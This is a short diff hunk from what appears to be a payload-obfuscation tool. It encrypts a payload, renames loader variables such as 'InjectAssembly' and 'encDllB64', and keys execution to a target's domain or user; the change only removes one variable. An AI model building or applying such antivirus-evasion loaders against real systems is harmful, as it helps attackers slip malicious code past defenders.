@@ -179,7 +179,7 @@ try:
         encrypted = Encrypter.encrypt1(payload, key)
         # Obfuscate variable and function names
         Obfuscator = Obfuscator()
-        hWindow, encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
+        encDllB64, encDllBytes, newIV, envKey, keyBytes, plaintext, InjectAssembly, key, iv, cyphertext, rijAlg, strBytes, assembly, method = Obfuscator.varobfs()
         if args.domain:
             check = "System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName"
         elif args.user:
